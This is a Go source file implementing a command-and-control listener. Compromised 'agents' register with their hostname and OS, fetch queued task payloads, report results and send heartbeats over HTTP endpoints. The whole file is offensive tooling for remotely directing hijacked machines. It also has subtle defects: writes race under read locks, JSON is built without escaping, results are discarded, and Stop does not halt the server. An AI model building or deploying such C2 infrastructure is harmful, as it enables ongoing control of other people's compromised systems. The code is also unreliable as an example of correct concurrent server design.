package c2listener

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"
)

type C2Listener struct {
	mu          sync.RWMutex
	addr        string
	port        int
	running     bool
	agents      map[string]*Agent
	tasks       map[string]*Task
}

type Agent struct {
	ID        string
	Hostname  string
	IP        string
	OS        string
	LastSeen  time.Time
	Connected bool
}

type Task struct {
	ID        string
	AgentID   string
	Type      string
	Payload   string
	Status    string
	CreatedAt time.Time
}

func NewC2Listener(addr string, port int) *C2Listener {
	return &C2Listener{
		addr:   addr,
		port:   port,
		agents: make(map[string]*Agent),
		tasks:  make(map[string]*Task),
	}
}

func (l *C2Listener) Start() error {
	l.mu.Lock()
	l.running = true
	l.mu.Unlock()

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/register", l.handleRegister)
	mux.HandleFunc("/api/v1/task", l.handleTask)
	mux.HandleFunc("/api/v1/result", l.handleResult)
	mux.HandleFunc("/api/v1/heartbeat", l.handleHeartbeat)

	addr := fmt.Sprintf("%s:%d", l.addr, l.port)
	log.Printf("Starting C2 listener on %s", addr)

	return http.ListenAndServe(addr, mux)
}

func (l *C2Listener) Stop() {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.running = false
}

func (l *C2Listener) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := generateID()
	hostname := r.Header.Get("X-Hostname")
	ip := r.RemoteAddr

	agent := &Agent{
		ID:        agentID,
		Hostname:  hostname,
		IP:        ip,
		OS:        r.Header.Get("X-OS"),
		LastSeen:  time.Now(),
		Connected: true,
	}

	l.mu.Lock()
	l.agents[agentID] = agent
	l.mu.Unlock()

	log.Printf("New agent registered: %s (%s)", agentID, hostname)

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	fmt.Fprintf(w, `{"agent_id": "%s"}`, agentID)
}

func (l *C2Listener) handleTask(w http.ResponseWriter, r *http.Request) {
	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		http.Error(w, "Missing agent ID", http.StatusBadRequest)
		return
	}

	l.mu.RLock()
	agent, exists := l.agents[agentID]
	l.mu.RUnlock()

	if !exists {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	agent.LastSeen = time.Now()

	task := l.getPendingTask(agentID)
	if task == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, `{"id": "%s", "type": "%s", "payload": "%s"}`, task.ID, task.Type, task.Payload)
}

func (l *C2Listener) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		http.Error(w, "Missing agent ID", http.StatusBadRequest)
		return
	}

	log.Printf("Result received from agent %s", agentID)

	w.WriteHeader(http.StatusOK)
}

func (l *C2Listener) handleHeartbeat(w http.ResponseWriter, r *http.Request) {
	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		http.Error(w, "Missing agent ID", http.StatusBadRequest)
		return
	}

	l.mu.RLock()
	agent, exists := l.agents[agentID]
	l.mu.RUnlock()

	if !exists {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	agent.LastSeen = time.Now()

	w.WriteHeader(http.StatusOK)
}

func (l *C2Listener) getPendingTask(agentID string) *Task {
	l.mu.RLock()
	defer l.mu.RUnlock()

	for _, task := range l.tasks {
		if task.AgentID == agentID && task.Status == "pending" {
			task.Status = "sent"
			return task
		}
	}

	return nil
}

func (l *C2Listener) AddTask(task *Task) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.tasks[task.ID] = task
}

func (l *C2Listener) GetAgents() []*Agent {
	l.mu.RLock()
	defer l.mu.RUnlock()

	agents := make([]*Agent, 0, len(l.agents))
	for _, agent := range l.agents {
		agents = append(agents, agent)
	}
	return agents
}

func generateID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}
